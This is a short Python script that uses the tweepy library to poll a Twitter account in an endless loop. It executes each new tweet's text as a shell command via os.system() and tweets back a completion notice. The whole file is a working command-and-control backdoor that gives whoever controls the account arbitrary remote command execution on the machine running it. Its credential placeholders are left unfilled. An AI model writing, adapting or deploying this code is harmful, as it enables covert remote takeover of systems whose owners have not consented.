#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import csv
import re
import os

import tweepy
import time

consumer_key = consumer_key
consumer_secret = CONSUMER_SECRET_KEY
access_key = ACCESS_KEY
access_secret = ACCESS_SECRET_KEY


def get_tweets(username):


    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
    auth.set_access_token(access_key, access_secret)
    api = tweepy.API(auth)


    number_of_tweets = 1


    for tweet in tweepy.Cursor(api.user_timeline, screen_name = username).items(number_of_tweets):

        tweet = str(tweet)

        tweetdata = re.search("'text': '(.*)', 'truncated'", tweet)
        tweetdata = tweetdata.group(1)
        if (tweetdata.find("READY FOR NEXT COMMAND") == -1):
            os.system(tweetdata)
            tweet_status = "SUCESSFULLY COMPLETED COMMAND: "+ tweetdata + "\nSLEEPING FOR 5 MINUTES"
            status = api.update_status(status=tweet_status)
            time.sleep(20)
            tweet_status = "READY FOR NEXT COMMAND"
            status = api.update_status(status=tweet_status)
        else:
            time.sleep(20)
    


while(1):
    get_tweets(USER_ID)

